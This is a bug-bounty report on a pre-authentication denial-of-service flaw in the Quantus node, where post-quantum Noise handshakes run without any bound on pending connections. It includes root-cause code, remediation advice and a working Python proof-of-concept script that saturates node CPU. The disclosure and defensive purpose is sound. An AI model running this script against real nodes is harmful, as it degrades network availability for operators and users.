# 89353 bc medium unbounded pre auth pq noise setup saturates full node cpu before established peer limits apply

**Submitted on Aug 18th 2026 at 18:58:28 UTC by @Porcupine17126 for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89353
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## Target

`https://github.com/immunefi-team/audit-comp-quantus-chain`

Tested node version: `quantus-node 0.8.0-exodus-3b243b870a5`

Tested competition revision: `3b243b870a5442a6e5f443056f67bbba87d472f5`

## Severity and exact in-scope impact

Suggested severity: **Medium**

Exact listed impact:

> Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Summary

Quantus configures litep2p's inbound limit as 10,000 **established** incoming connections. Pending inbound sockets are checked against the established set but are not reserved in that set. Therefore, while the node has zero authenticated peers, an arbitrary number of pending sockets can pass the check and enter transport negotiation concurrently.

This becomes a qualifying resource vulnerability because Quantus replaced upstream Noise with a post-quantum `pqXX` handshake. Immediately after an unauthenticated client negotiates the public `/noise` multistream protocol, the listener synchronously:

1. generates a fresh ML-KEM-768 keypair;
2. creates a Clatter `pqXX` session; and
3. signs the KEM public key with the node's ML-DSA-87 identity key.

Only after completing this work does the listener await pqXX message 1 from the remote socket. The attacker never needs to send that message, authenticate a PeerId, own an account, sign a transaction, pay a fee, or guess a value.

The loopback PoC reproduced in the Proof of Concept section sends only the two ordinary multistream frames—28 application bytes per connection—then stops before pqXX message 1. On the unmodified scoped full-node binary:

* idle CPU: **0.0–0.2%**;
* 256 plain TCP sockets: **1.1% peak CPU**;
* 256 sockets negotiating `/noise`: **78.8%, 95.4%, 98.4%, 99.0%, and 54.5% CPU** in consecutive one-second samples;
* attack setup: **256/256 succeeded, zero errors, 4.625 seconds**;
* RPC `system_health.peers`: **0 throughout**; and
* recovery after closure: **0.2% CPU, zero peers**.

The attack consumed approximately 4.61 node CPU-seconds during the 4.625-second setup interval, while the matched plain-TCP control consumed about 0.06 CPU-seconds over its entire 18-second measurement. The clean attack therefore saturated one full network-processing core at roughly 99% and exceeded the listed 30% threshold by a wide margin. A separate 1,024-connection run kept the node at approximately 95–100% CPU for about 17 seconds; the attacker can repeat bounded bursts indefinitely.

## Production reachability

The vulnerable code is the network backend used by `quantus-node`. Validator nodes default to raw TCP listeners, and the PoC uses the same TCP transport and `/noise` negotiation path on an explicit loopback listener. The test uses role `FULL` only to avoid authority mining contaminating the CPU baseline; the transport, connection manager, identity, and PQ Noise implementation are unchanged.

No request was sent to a Quantus-operated host. All impact measurements used an unmodified local node bound to `127.0.0.1`.

## Root cause

### 1. The configured inbound cap tracks established connections only

`client/network/src/lib.rs:309-310` names the limit accordingly:

```rust
/// The maximum number of concurrent established connections that were incoming.
pub const MAX_CONNECTIONS_ESTABLISHED_INCOMING: u32 = 10_000;
```

`client/network/src/litep2p/mod.rs:515-522` installs that value as the only incoming connection limit:

```rust
.with_connection_limits(ConnectionLimitsConfig::default().max_incoming_connections(
    Some(crate::MAX_CONNECTIONS_ESTABLISHED_INCOMING as usize),
))
```

`client/litep2p/src/transport/manager/limits.rs:104-112` checks a pending socket only against `incoming_connections.len()`:

```rust
pub fn on_incoming(&mut self) -> Result<(), ConnectionLimitsError> {
    if let Some(max_incoming_connections) = self.config.max_incoming_connections {
        if self.incoming_connections.len() >= max_incoming_connections {
            return Err(ConnectionLimitsError::MaxIncomingConnectionsExceeded);
        }
    }
    Ok(())
}
```

The connection ID is inserted only later, after authentication and establishment, at lines 144-152:

```rust
pub fn accept_established_connection(
    &mut self,
    connection_id: ConnectionId,
    is_listener: bool,
) {
    if is_listener {
        if self.config.max_incoming_connections.is_some() {
            self.incoming_connections.insert(connection_id);
        }
    }
}
```

`client/litep2p/src/transport/manager/mod.rs:1374-1386` consequently accepts every pending inbound socket while the established set remains below 10,000:

```rust
TransportEvent::PendingInboundConnection { connection_id } => {
    if self.on_pending_incoming_connection().is_ok() {
        let _ = self
            .transports
            .get_mut(&transport)
            .expect("transport to exist")
            .accept_pending(connection_id);
```

There is no separate pending-handshake reservation, semaphore, or per-source admission bound.

### 2. Quantus performs expensive PQ work before reading attacker-controlled handshake data

At the beginning of every Noise handshake, `client/litep2p/src/crypto/noise/mod.rs:769-772` calls `NoiseContext::new`:

```rust
let handle_handshake = async move {
    tracing::debug!(target: LOG_TARGET, ?role, ?ty,
        "start noise handshake (pqXX + ML-KEM 768)");
    let mut noise = NoiseContext::new(keypair, role)?;
```

`NoiseContext::new` creates a fresh KEM keypair, a Clatter session, and the signed identity payload:

```rust
pub fn new(keypair: &Keypair, role: Role) -> Result<Self, NegotiationError> {
    let kem_keypair = protocol::Keypair::new();
    let is_initiator = matches!(role, Role::Dialer);
    let session = ClatterSession::new(&[], is_initiator, &kem_keypair)?;
    Self::assemble(session, kem_keypair, keypair, role)
}
```

`assemble` performs the ML-DSA identity signature:

```rust
let signature = id_keys
    .sign(&[STATIC_KEY_DOMAIN.as_bytes(), kem_keypair.public().as_ref()].concat())?;
```

`client/litep2p/src/crypto/noise/protocol.rs:163-171` shows that the keypair is generated per context:

```rust
pub fn new() -> Self {
    let keypair = MlKem768::genkey().expect("ML-KEM key generation should not fail");
    // copy the fresh secret and public keys
}
```

Only after all of that does the listener execute `read_handshake_message` for pqXX message 1 at `noise/mod.rs:809-813`. The PoC deliberately stops at this boundary.

## Why this is not an upstream-only report

The generic established-connection bookkeeping exists in upstream litep2p 0.13.3. This report does not claim that bookkeeping alone as the qualifying impact.

The resource amplification comes from Quantus's in-repository rewrite of upstream Noise. Upstream v0.13.3 `NoiseContext::new` uses Snow's ordinary DH `generate_keypair()` and an Ed25519 identity. The scoped Quantus source instead creates a fresh ML-KEM-768 keypair, a four-message Clatter `pqXX` session, and an ML-DSA identity signature before reading pqXX message 1. Those Quantus-specific operations are precisely what the matched PoC triggers and measures.

The 256-socket plain control peaks at only 1.1% CPU; negotiating Quantus's custom `/noise` path with the same connection count reaches 99.0%. The eligible defect is therefore the Quantus PQ integration performing expensive custom work before any bounded admission, not a best-practice complaint about generic TCP or unmodified Substrate.

## Why existing limits and timeout do not mitigate the impact

* **10,000 incoming limit:** counts only authenticated, established connections. The PoC keeps the count at zero.
* **10-second transport timeout:** limits how long one socket survives, but cannot recover the ML-KEM key generation and ML-DSA signing CPU already spent. Replenishment is faster than expiration.
* **OS descriptor/backlog limits:** 256 sockets are sufficient; the test does not approach the local 1,048,575 descriptor limit.
* **Peer policy or identity checks:** occur only after the expensive pre-authentication work.
* **Traffic/rate argument:** each connection sends 28 application bytes and no PQ payload. The clean run uses only 7,168 total application bytes to saturate processing for about five seconds. Repeating the same deterministic burst sustains the load.

## Recommended remediation

Add a small, separate bound for **pending inbound handshakes** and reserve a slot before `accept_pending(connection_id)`. Release it on every success, rejection, error, close, and timeout path. The pending cap must not reuse the established-connection set.

Also consider per-source admission/rate limits and avoiding fresh ML-KEM key generation plus ML-DSA signing before a bounded admission or stateless anti-abuse step. The established 10,000-peer limit should remain independent.

Add regressions which:

1. configure a small pending-handshake cap;
2. open more sockets than the cap without authenticating;
3. assert excess sockets are rejected before `NoiseContext::new`;
4. verify reservations are released on timeout and failed negotiation; and
5. confirm an attacker cannot starve a legitimate incoming handshake.

## Public-known-issue check

The listed Quantus Substrate audit does not cover litep2p, PQ Noise, or connection admission. Searches of the scoped repository, upstream litep2p issues, and upstream changelog found adjacent public work for established-connection limits, rejected-connection accounting, and handshake timeouts, but no disclosure of unbounded pending PQ handshakes or the demonstrated pre-auth ML-KEM/ML-DSA CPU amplification.

Private duplicate risk remains possible, as in any live audit competition.

## Proof of Concept

Save the following as `poc.py` and run it only against a local node.

```python
#!/usr/bin/env python3
"""Bounded loopback PoC for Quantus pending inbound handshake accounting.

The `plain` mode holds TCP sockets before multistream negotiation. The `noise`
mode negotiates `/noise` and then stops before pqXX message 1, leaving every
connection unauthenticated while the listener retains its newly created PQ
handshake state until the transport timeout.
"""

import argparse
import asyncio
import json
import time
import urllib.request


MULTISTREAM = b"/multistream/1.0.0\n"
NOISE = b"/noise\n"


def encode_uvarint(value: int) -> bytes:
    encoded = bytearray()
    while value >= 0x80:
        encoded.append((value & 0x7F) | 0x80)
        value >>= 7
    encoded.append(value)
    return bytes(encoded)


def frame(payload: bytes) -> bytes:
    return encode_uvarint(len(payload)) + payload


async def read_uvarint(reader: asyncio.StreamReader) -> int:
    value = 0
    shift = 0
    for _ in range(10):
        byte = (await reader.readexactly(1))[0]
        value |= (byte & 0x7F) << shift
        if byte & 0x80 == 0:
            return value
        shift += 7
    raise ValueError("oversized uvarint")


async def read_frame(reader: asyncio.StreamReader) -> bytes:
    length = await read_uvarint(reader)
    return await reader.readexactly(length)


def rpc_peers(url: str) -> int:
    request = urllib.request.Request(
        url,
        data=json.dumps(
            {"jsonrpc": "2.0", "id": 1, "method": "system_health", "params": []}
        ).encode(),
        headers={"content-type": "application/json"},
    )
    with urllib.request.urlopen(request, timeout=2) as response:
        return json.load(response)["result"]["peers"]


async def open_one(
    host: str,
    port: int,
    mode: str,
    gate: asyncio.Semaphore,
) -> asyncio.StreamWriter:
    async with gate:
        reader, writer = await asyncio.open_connection(host, port)
        if mode == "noise":
            writer.write(frame(MULTISTREAM))
            await writer.drain()
            if await read_frame(reader) != MULTISTREAM:
                raise RuntimeError("multistream negotiation failed")

            writer.write(frame(NOISE))
            await writer.drain()
            if await read_frame(reader) != NOISE:
                raise RuntimeError("noise negotiation failed")

        return writer


async def run(args: argparse.Namespace) -> None:
    gate = asyncio.Semaphore(args.concurrency)
    started = time.monotonic()
    results = await asyncio.gather(
        *(open_one(args.host, args.port, args.mode, gate) for _ in range(args.count)),
        return_exceptions=True,
    )
    writers = [result for result in results if isinstance(result, asyncio.StreamWriter)]
    errors = [result for result in results if isinstance(result, BaseException)]
    elapsed = time.monotonic() - started

    peers = rpc_peers(args.rpc)
    print(
        f"READY mode={args.mode} requested={args.count} open={len(writers)} "
        f"errors={len(errors)} elapsed={elapsed:.3f}s peers={peers}",
        flush=True,
    )
    if errors:
        print(f"FIRST_ERROR {type(errors[0]).__name__}: {errors[0]}", flush=True)

    await asyncio.sleep(args.hold)
    for writer in writers:
        writer.close()
    await asyncio.gather(*(writer.wait_closed() for writer in writers), return_exceptions=True)
    print(f"CLOSED open={len(writers)} peers={rpc_peers(args.rpc)}", flush=True)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("mode", choices=("plain", "noise"))
    parser.add_argument("--count", type=int, default=2048)
    parser.add_argument("--concurrency", type=int, default=512)
    parser.add_argument("--hold", type=float, default=20.0)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=30444)
    parser.add_argument("--rpc", default="http://127.0.0.1:9947")
    return parser.parse_args()


if __name__ == "__main__":
    asyncio.run(run(parse_args()))
```

### Environment

```
macOS 26.3, arm64
Python 3.14.6
quantus-node 0.8.0-exodus-3b243b870a5
open-file limit: 1,048,575
```

{% stepper %}
{% step %}

## Start the exact unmodified scoped node

From the scoped repository root:

```bash
SSL_CERT_FILE=/etc/ssl/cert.pem \
./target/debug/quantus-node \
  --chain dev \
  --base-path /private/tmp/quantus-pq-poc-node \
  --database paritydb \
  --db-cache 1 \
  --state-pruning 1 \
  --blocks-pruning 1 \
  --listen-addr /ip4/127.0.0.1/tcp/30444 \
  --rpc-port 9947 \
  --no-prometheus \
  --no-telemetry \
  --no-mdns \
  --log 'litep2p=info,sub-libp2p=warn,info'
```

Wait until RPC reports zero peers and the process is idle:

```bash
curl -sS -H 'content-type: application/json' \
  --data '{"jsonrpc":"2.0","id":1,"method":"system_health","params":[]}' \
  http://127.0.0.1:9947
```

Observed:

```json
{"jsonrpc":"2.0","id":1,"result":{"peers":0,"isSyncing":false,"shouldHavePeers":false}}
```

{% endstep %}

{% step %}

## Run the matched plain-TCP control

Record the node with `top -l 18 -s 1 -pid <PID> -stats pid,command,cpu,mem,time`, then run:

```bash
python3 poc.py plain --count 256 --concurrency 256 --hold 12
```

Observed driver output:

```
READY mode=plain requested=256 open=256 errors=0 elapsed=0.015s peers=0
CLOSED open=256 peers=0
```

The node stayed between 0.0% and 1.1% CPU. Physical footprint moved only from 40 MB to 41 MB.
{% endstep %}

{% step %}

## Run the unauthenticated PQ negotiation

With the same count and measurement command:

```bash
python3 poc.py noise --count 256 --concurrency 256 --hold 12
```

Observed driver output:

```
READY mode=noise requested=256 open=256 errors=0 elapsed=4.625s peers=0
CLOSED open=256 peers=0
```

Relevant consecutive process samples:

```
PID    COMMAND      %CPU MEM  TIME
65550  quantus-node 78.8 41M+ 01:11.44
65550  quantus-node 95.4 42M+ 01:12.46
65550  quantus-node 98.4 43M+ 01:13.52
65550  quantus-node 99.0 44M+ 01:14.59
65550  quantus-node 54.5 44M+ 01:15.17
65550  quantus-node 1.8  44M  01:15.19
```

After sockets closed:

```
system_health.peers = 0
CPU = 0.2%
physical footprint = 44 MB
```

The complete commands and selected raw measurements are reproduced above.
{% endstep %}
{% endstepper %}
